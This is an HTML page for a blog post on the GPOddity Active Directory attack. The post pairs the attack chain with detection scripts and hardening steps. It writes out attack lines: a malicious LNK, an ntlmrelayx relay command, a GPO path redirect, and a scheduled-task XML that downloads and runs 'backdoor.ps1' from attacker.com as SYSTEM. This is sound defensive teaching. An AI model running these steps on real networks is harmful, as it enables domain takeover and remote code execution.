@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>GPOddity: Understanding the Advanced Privilege Escalation Attack in Active Directory | Rav3nf0</title>
+<meta name="keywords" content="Red Team, Active Directory">
+<meta name="description" content="GPOddity: Understanding the Advanced Privilege Escalation Attack in Active Directory Introduction Active Directory (AD) security continues to be a critical concern for organizations worldwide. Among the numerous attack vectors that threaten AD environments, GPOddity stands out as a particularly sophisticated technique that leverages Group Policy Objects (GPOs) and NTLM relaying to achieve privilege escalation. First documented by security researchers at Synacktiv, this attack can bypass many common security controls and lead to domain-wide compromise.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/technical_blog/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/technical_blog/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Rav3nf0 (Alt + H)">Rav3nf0</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/posts/" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      GPOddity: Understanding the Advanced Privilege Escalation Attack in Active Directory
+    </h1>
+    <div class="post-meta"><span title='2025-05-21 12:47:16 +0530 IST'>May 21, 2025</span>&nbsp;·&nbsp;7 min
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#gpoddity-understanding-the-advanced-privilege-escalation-attack-in-active-directory" aria-label="GPOddity: Understanding the Advanced Privilege Escalation Attack in Active Directory">GPOddity: Understanding the Advanced Privilege Escalation Attack in Active Directory</a><ul>
+                        
+                <li>
+                    <a href="#introduction" aria-label="Introduction">Introduction</a></li>
+                <li>
+                    <a href="#what-is-gpoddity" aria-label="What is GPOddity?">What is GPOddity?</a></li>
+                <li>
+                    <a href="#the-attack-chain-explained" aria-label="The Attack Chain Explained">The Attack Chain Explained</a><ul>
+                        
+                <li>
+                    <a href="#1-initial-access-and-malicious-lnk-deployment" aria-label="1. Initial Access and Malicious LNK Deployment">1. Initial Access and Malicious LNK Deployment</a></li>
+                <li>
+                    <a href="#2-authentication-triggering" aria-label="2. Authentication Triggering">2. Authentication Triggering</a></li>
+                <li>
+                    <a href="#3-ntlm-relay-attack" aria-label="3. NTLM Relay Attack">3. NTLM Relay Attack</a></li>
+                <li>
+                    <a href="#4-gpo-manipulation-through-gpoddity" aria-label="4. GPO Manipulation through GPOddity">4. GPO Manipulation through GPOddity</a></li>
+                <li>
+                    <a href="#5-group-policy-update-and-application" aria-label="5. Group Policy Update and Application">5. Group Policy Update and Application</a></li>
+                <li>
+                    <a href="#6-execution-of-malicious-policy" aria-label="6. Execution of Malicious Policy">6. Execution of Malicious Policy</a></li></ul>
+                </li>
+                <li>
+                    <a href="#why-gpoddity-is-particularly-dangerous" aria-label="Why GPOddity is Particularly Dangerous">Why GPOddity is Particularly Dangerous</a></li>
+                <li>
+                    <a href="#technical-prerequisites-for-the-attack" aria-label="Technical Prerequisites for the Attack">Technical Prerequisites for the Attack</a></li>
+                <li>
+                    <a href="#detecting-gpoddity-attacks" aria-label="Detecting GPOddity Attacks">Detecting GPOddity Attacks</a><ul>
+                        
+                <li>
+                    <a href="#event-log-monitoring" aria-label="Event Log Monitoring">Event Log Monitoring</a></li>
+                <li>
+                    <a href="#network-monitoring" aria-label="Network Monitoring">Network Monitoring</a></li>
+                <li>
+                    <a href="#regular-gpo-auditing" aria-label="Regular GPO Auditing">Regular GPO Auditing</a></li></ul>
+                </li>
+                <li>
+                    <a href="#mitigation-strategies" aria-label="Mitigation Strategies">Mitigation Strategies</a><ul>
+                        
+                <li>
+                    <a href="#1-enforce-ldap-signing-and-channel-binding" aria-label="1. Enforce LDAP Signing and Channel Binding">1. Enforce LDAP Signing and Channel Binding</a></li>
+                <li>
+                    <a href="#2-implement-smb-signing" aria-label="2. Implement SMB Signing">2. Implement SMB Signing</a></li>
+                <li>
+                    <a href="#3-block-outbound-smb" aria-label="3. Block Outbound SMB">3. Block Outbound SMB</a></li>
+                <li>
+                    <a href="#4-deploy-ntlm-protections" aria-label="4. Deploy NTLM Protections">4. Deploy NTLM Protections</a></li>
+                <li>
+                    <a href="#5-monitor-gpo-changes" aria-label="5. Monitor GPO Changes">5. Monitor GPO Changes</a></li></ul>
+                </li>
+                <li>
+                    <a href="#conclusion" aria-label="Conclusion">Conclusion</a></li>
+                <li>
+                    <a href="#references" aria-label="References">References</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="gpoddity-understanding-the-advanced-privilege-escalation-attack-in-active-directory">GPOddity: Understanding the Advanced Privilege Escalation Attack in Active Directory<a hidden class="anchor" aria-hidden="true" href="#gpoddity-understanding-the-advanced-privilege-escalation-attack-in-active-directory">#</a></h1>
+<h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
+<p>Active Directory (AD) security continues to be a critical concern for organizations worldwide. Among the numerous attack vectors that threaten AD environments, GPOddity stands out as a particularly sophisticated technique that leverages Group Policy Objects (GPOs) and NTLM relaying to achieve privilege escalation. First documented by security researchers at Synacktiv, this attack can bypass many common security controls and lead to domain-wide compromise. In this technical deep dive, we&rsquo;ll explore how GPOddity works, why it&rsquo;s dangerous, and how security teams can defend against it.</p>
+<h2 id="what-is-gpoddity">What is GPOddity?<a hidden class="anchor" aria-hidden="true" href="#what-is-gpoddity">#</a></h2>
+<p>GPOddity is an attack technique that exploits the way Active Directory handles Group Policy Objects. It allows attackers with limited initial access to potentially gain domain control by manipulating GPO settings through NTLM relay attacks. What makes this attack particularly concerning is that it abuses legitimate Windows features and protocols, making it difficult to detect through conventional security monitoring.</p>
+<h2 id="the-attack-chain-explained">The Attack Chain Explained<a hidden class="anchor" aria-hidden="true" href="#the-attack-chain-explained">#</a></h2>
+<p>Let&rsquo;s break down the GPOddity attack chain into its component steps:</p>
+<h3 id="1-initial-access-and-malicious-lnk-deployment">1. Initial Access and Malicious LNK Deployment<a hidden class="anchor" aria-hidden="true" href="#1-initial-access-and-malicious-lnk-deployment">#</a></h3>
+<p>The attack begins when an attacker uploads a specially crafted Windows shortcut file (LNK) to a network share accessible to target users. These LNK files are designed to force NTLM authentication when opened by a user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Example of creating a malicious LNK that forces authentication to attacker&#39;s SMB server</span>
+</span></span><span style="display:flex;"><span>$WshShell = New-Object -ComObject WScript.Shell
+</span></span><span style="display:flex;"><span>$Shortcut = $WshShell.CreateShortcut(<span style="color:#e6db74">&#34;\\share\documents\interesting_document.lnk&#34;</span>)
+</span></span><span style="display:flex;"><span>$Shortcut.TargetPath = <span style="color:#e6db74">&#34;\\attacker-smb\share\bait.txt&#34;</span>
+</span></span><span style="display:flex;"><span>$Shortcut.Save()
+</span></span></code></pre></div><h3 id="2-authentication-triggering">2. Authentication Triggering<a hidden class="anchor" aria-hidden="true" href="#2-authentication-triggering">#</a></h3>
+<p>When a domain user opens the malicious LNK file, their system attempts to access the remote resource specified in the shortcut. This initiates an NTLM authentication process, as the system tries to establish a connection to the specified path.</p>
+<p>For example, if a user named <code>jsmith</code> in the <code>DCORP</code> domain opens the LNK file, their workstation will attempt to authenticate to the attacker&rsquo;s SMB server using jsmith&rsquo;s credentials.</p>
+<h3 id="3-ntlm-relay-attack">3. NTLM Relay Attack<a hidden class="anchor" aria-hidden="true" href="#3-ntlm-relay-attack">#</a></h3>
+<p>The attacker captures this authentication attempt and, instead of simply accepting it, relays it to a domain controller or other high-value target within the network. This is classic NTLM relay, but with a specific target in mind: the LDAP service on a domain controller.</p>
+<p>Tools like Responder and ntlmrelayx from Impacket can be used for this purpose:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Capture and relay NTLM authentication to LDAP service</span>
+</span></span><span style="display:flex;"><span>sudo ntlmrelayx.py -t ldap://dcorp-dc.dcorp.local --delegate-access
+</span></span></code></pre></div><h3 id="4-gpo-manipulation-through-gpoddity">4. GPO Manipulation through GPOddity<a hidden class="anchor" aria-hidden="true" href="#4-gpo-manipulation-through-gpoddity">#</a></h3>
+<p>This is where the attack gets interesting. Using the relayed authentication, the attacker modifies the <code>gpcfilesyspath</code> attribute of a Group Policy Object. This attribute specifies where the actual policy files are stored and retrieved from when applied to systems.</p>
+<p>The attacker changes this path to point to an SMB server under their control:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Example PowerShell command to modify the gpcfilesyspath (executed through the relayed authentication)</span>
+</span></span><span style="display:flex;"><span>Set-ADObject -Identity <span style="color:#e6db74">&#34;CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=dcorp,DC=local&#34;</span> <span style="color:#f92672">-Replace</span> @{gPCFileSysPath=<span style="color:#e6db74">&#34;\\attacker-smb\fake-policies\{31B2F340-016D-11D2-945F-00C04FB984F9}&#34;</span>}
+</span></span></code></pre></div><p>This effectively reroutes all computers looking for this policy to fetch it from the attacker&rsquo;s server instead of the legitimate domain location. The most sophisticated aspect here is that the attacker doesn&rsquo;t need to modify the actual GPO content in SYSVOL; they simply redirect where systems look for that content.</p>
+<h3 id="5-group-policy-update-and-application">5. Group Policy Update and Application<a hidden class="anchor" aria-hidden="true" href="#5-group-policy-update-and-application">#</a></h3>
+<p>When systems in the domain perform their regular Group Policy update (typically every 90 minutes, or when forced via <code>gpupdate /force</code>), they will now contact the attacker&rsquo;s SMB server to retrieve the policy settings.</p>
+<p>The domain computers trust this process implicitly because the GPO itself is still a legitimate object in Active Directory—only its file path has been changed.</p>
+<h3 id="6-execution-of-malicious-policy">6. Execution of Malicious Policy<a hidden class="anchor" aria-hidden="true" href="#6-execution-of-malicious-policy">#</a></h3>
+<p>On the attacker&rsquo;s SMB server, they&rsquo;ve prepared a malicious Group Policy Template (GPT) that includes configurations designed for privilege escalation. Commonly, this involves creating a scheduled task that executes with SYSTEM privileges on targeted machines.</p>
+<p>For example, the malicious GPO could contain a scheduled task definition like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;ScheduledTasks</span> <span style="color:#a6e22e">clsid=</span><span style="color:#e6db74">&#34;{CC63F200-7309-4ba0-B154-A71CD118DBCC}&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;Task</span> <span style="color:#a6e22e">clsid=</span><span style="color:#e6db74">&#34;{2DEECB1C-261F-4e13-9B21-16FB83BC03BD}&#34;</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;SecurityScan&#34;</span> <span style="color:#a6e22e">image=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">changed=</span><span style="color:#e6db74">&#34;2023-06-12 10:24:51&#34;</span> <span style="color:#a6e22e">uid=</span><span style="color:#e6db74">&#34;{52521F4D-C3DB-4939-9553-32A1DD27E61A}&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;Properties</span> <span style="color:#a6e22e">action=</span><span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;SecurityScan&#34;</span> <span style="color:#a6e22e">runAs=</span><span style="color:#e6db74">&#34;NT AUTHORITY\System&#34;</span> <span style="color:#a6e22e">logonType=</span><span style="color:#e6db74">&#34;InteractiveToken&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;Task</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.3&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;Principals&gt;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;Principal</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;Author&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;UserId&gt;</span>NT AUTHORITY\System<span style="color:#f92672">&lt;/UserId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;RunLevel&gt;</span>HighestAvailable<span style="color:#f92672">&lt;/RunLevel&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;LogonType&gt;</span>InteractiveToken<span style="color:#f92672">&lt;/LogonType&gt;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;/Principal&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/Principals&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;Actions</span> <span style="color:#a6e22e">Context=</span><span style="color:#e6db74">&#34;Author&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;Exec&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;Command&gt;</span>powershell.exe<span style="color:#f92672">&lt;/Command&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;Arguments&gt;</span>-ExecutionPolicy Bypass -Command &#34;IEX (New-Object Net.WebClient).DownloadString(&#39;http://attacker.com/backdoor.ps1&#39;)&#34;<span style="color:#f92672">&lt;/Arguments&gt;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;/Exec&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/Actions&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;Triggers&gt;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;TimeTrigger&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;StartBoundary&gt;</span>2023-06-12T00:00:00<span style="color:#f92672">&lt;/StartBoundary&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;Enabled&gt;</span>true<span style="color:#f92672">&lt;/Enabled&gt;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;/TimeTrigger&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/Triggers&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/Task&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/Properties&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/Task&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/ScheduledTasks&gt;</span>
+</span></span></code></pre></div><p>When this policy is applied, it creates a scheduled task that runs with SYSTEM privileges, downloads a malicious script from the attacker&rsquo;s server, and executes it—all through a legitimate and trusted Windows mechanism.</p>
+<h2 id="why-gpoddity-is-particularly-dangerous">Why GPOddity is Particularly Dangerous<a hidden class="anchor" aria-hidden="true" href="#why-gpoddity-is-particularly-dangerous">#</a></h2>
+<p>GPOddity presents several challenges for defenders:</p>
+<ol>
+<li>
+<p><strong>Legitimate Protocol Usage</strong>: The attack leverages standard, allowed protocols and mechanisms in Windows domains, making it difficult to block without impacting normal operations.</p>
+</li>
+<li>
+<p><strong>No Direct GPO Modification</strong>: Unlike traditional GPO attacks that modify the actual GPO content in SYSVOL (which might be monitored), GPOddity merely changes a pointer in AD to redirect systems elsewhere.</p>
+</li>
+<li>
+<p><strong>Domain-Wide Impact</strong>: A successful GPOddity attack potentially affects all systems in the domain, allowing for widespread compromise from a single entry point.</p>
+</li>
+<li>
+<p><strong>Elevated Privileges</strong>: The malicious actions execute with SYSTEM privileges on affected machines, giving attackers complete control.</p>
+</li>
+<li>
+<p><strong>Persistence</strong>: Once established, this attack can persist through domain rebuilds if not properly remediated, as the redirected gpcfilesyspath attribute remains changed.</p>
+</li>
+</ol>
+<h2 id="technical-prerequisites-for-the-attack">Technical Prerequisites for the Attack<a hidden class="anchor" aria-hidden="true" href="#technical-prerequisites-for-the-attack">#</a></h2>
+<p>For a GPOddity attack to succeed, several conditions must be met:</p>
+<ul>
+<li><strong>NTLM Authentication</strong>: The domain must allow NTLM authentication (still common in most environments).</li>
+<li><strong>SMB Access</strong>: Network controls must allow SMB connections from domain systems to the attacker&rsquo;s server.</li>
+<li><strong>LDAP Signing</strong>: If LDAP signing is not enforced, NTLM relay to LDAP becomes possible.</li>
+<li><strong>User Execution</strong>: A user with sufficient privileges must be tricked into triggering the initial authentication.</li>
+</ul>
+<h2 id="detecting-gpoddity-attacks">Detecting GPOddity Attacks<a hidden class="anchor" aria-hidden="true" href="#detecting-gpoddity-attacks">#</a></h2>
+<p>Security teams can implement several detection strategies:</p>
+<h3 id="event-log-monitoring">Event Log Monitoring<a hidden class="anchor" aria-hidden="true" href="#event-log-monitoring">#</a></h3>
+<p>Monitor for suspicious changes to GPO attributes, particularly <code>gpcfilesyspath</code> modifications pointing outside the domain:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># PowerShell script to detect external gpcfilesyspath values</span>
+</span></span><span style="display:flex;"><span>$suspiciousGPOs = Get-ADObject -LDAPFilter <span style="color:#e6db74">&#34;(objectCategory=groupPolicyContainer)&#34;</span> -Properties gPCFileSysPath |
+</span></span><span style="display:flex;"><span>    Where-Object { $_.gPCFileSysPath <span style="color:#f92672">-notlike</span> <span style="color:#e6db74">&#34;\\</span>$((Get-ADDomain).DNSRoot)<span style="color:#e6db74">\*&#34;</span> }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($suspiciousGPOs) {
+</span></span><span style="display:flex;"><span>    Write-Warning <span style="color:#e6db74">&#34;Potentially malicious GPO redirection detected:&#34;</span>
+</span></span><span style="display:flex;"><span>    $suspiciousGPOs | Select-Object Name, DistinguishedName, gPCFileSysPath
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="network-monitoring">Network Monitoring<a hidden class="anchor" aria-hidden="true" href="#network-monitoring">#</a></h3>
+<p>Implement monitoring for Group Policy retrieval from non-domain servers:</p>
+<ul>
+<li>Watch for SMB connections to external servers during Group Policy processing times</li>
+<li>Alert on systems retrieving policy files from unauthorized sources</li>
+</ul>
+<h3 id="regular-gpo-auditing">Regular GPO Auditing<a hidden class="anchor" aria-hidden="true" href="#regular-gpo-auditing">#</a></h3>
+<p>Perform regular auditing of all GPOs in the environment:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Export all GPO paths for review</span>
+</span></span><span style="display:flex;"><span>Get-ADObject -LDAPFilter <span style="color:#e6db74">&#34;(objectCategory=groupPolicyContainer)&#34;</span> -Properties DisplayName, gPCFileSysPath |
+</span></span><span style="display:flex;"><span>    Select-Object DisplayName, DistinguishedName, gPCFileSysPath |
+</span></span><span style="display:flex;"><span>    Export-Csv -Path <span style="color:#e6db74">&#34;GPO_Audit_</span>$(Get-Date -Format <span style="color:#e6db74">&#39;yyyyMMdd&#39;</span>)<span style="color:#e6db74">.csv&#34;</span> -NoTypeInformation
+</span></span></code></pre></div><h2 id="mitigation-strategies">Mitigation Strategies<a hidden class="anchor" aria-hidden="true" href="#mitigation-strategies">#</a></h2>
+<p>To protect against GPOddity attacks, organizations should implement these security controls:</p>
+<h3 id="1-enforce-ldap-signing-and-channel-binding">1. Enforce LDAP Signing and Channel Binding<a hidden class="anchor" aria-hidden="true" href="#1-enforce-ldap-signing-and-channel-binding">#</a></h3>
+<p>LDAP signing and channel binding prevent NTLM relay attacks to LDAP services:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Configure LDAP signing requirements</span>
+</span></span><span style="display:flex;"><span>Set-ItemProperty -Path <span style="color:#e6db74">&#34;HKLM:\System\CurrentControlSet\Services\NTDS\Parameters&#34;</span> -Name <span style="color:#e6db74">&#34;LDAPServerIntegrity&#34;</span> -Value <span style="color:#ae81ff">2</span>
+</span></span></code></pre></div><h3 id="2-implement-smb-signing">2. Implement SMB Signing<a hidden class="anchor" aria-hidden="true" href="#2-implement-smb-signing">#</a></h3>
+<p>Require SMB signing on all domain controllers and servers:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Enable SMB signing</span>
+</span></span><span style="display:flex;"><span>Set-ItemProperty -Path <span style="color:#e6db74">&#34;HKLM:\System\CurrentControlSet\Services\LanmanServer\Parameters&#34;</span> -Name <span style="color:#e6db74">&#34;RequireSecuritySignature&#34;</span> -Value <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><h3 id="3-block-outbound-smb">3. Block Outbound SMB<a hidden class="anchor" aria-hidden="true" href="#3-block-outbound-smb">#</a></h3>
+<p>Use network segmentation and firewall rules to prevent client systems from establishing SMB connections to external or unauthorized networks.</p>
+<h3 id="4-deploy-ntlm-protections">4. Deploy NTLM Protections<a hidden class="anchor" aria-hidden="true" href="#4-deploy-ntlm-protections">#</a></h3>
+<p>Implement NTLM protection mechanisms such as restricting NTLM authentication where possible and enabling Extended Protection for Authentication (EPA):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Configure NTLM restrictions</span>
+</span></span><span style="display:flex;"><span>Set-ItemProperty -Path <span style="color:#e6db74">&#34;HKLM:\System\CurrentControlSet\Control\Lsa\MSV1_0&#34;</span> -Name <span style="color:#e6db74">&#34;RestrictSendingNTLMTraffic&#34;</span> -Value <span style="color:#ae81ff">2</span>
+</span></span></code></pre></div><h3 id="5-monitor-gpo-changes">5. Monitor GPO Changes<a hidden class="anchor" aria-hidden="true" href="#5-monitor-gpo-changes">#</a></h3>
+<p>Implement monitoring for changes to GPO-related objects in Active Directory, especially focusing on modifications to the <code>gpcfilesyspath</code> attribute.</p>
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>GPOddity represents a sophisticated evolution in Active Directory attacks, demonstrating how legitimate management mechanisms can be weaponized for privilege escalation. By manipulating where Group Policy files are retrieved from rather than their content, attackers can bypass many traditional security controls.</p>
+<p>Defending against such attacks requires a multi-layered approach, including protocol-level protections like LDAP signing, network controls to prevent unauthorized SMB connections, and robust monitoring to detect suspicious GPO modifications.</p>
+<p>As Active Directory remains a critical component of enterprise identity and access management, understanding attacks like GPOddity is essential for security professionals tasked with protecting these environments. By implementing the detection and mitigation strategies outlined in this article, organizations can significantly reduce their exposure to this threat vector.</p>
+<h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
+<ul>
+<li>Synacktiv Research: <a href="https://www.synacktiv.com/en/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more">GPOddity - Exploiting Active Directory GPOs through NTLM Relaying and More</a></li>
+<li>Microsoft Security Guidance: <a href="https://support.microsoft.com/en-us/topic/mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429">Mitigating NTLM Relay Attacks</a></li>
+<li>MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1484/">Group Policy Modification - T1484</a></li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/red-team/">Red Team</a></li>
+      <li><a href="http://localhost:1313/tags/active-directory/">Active Directory</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2025 <a href="http://localhost:1313/">Rav3nf0</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
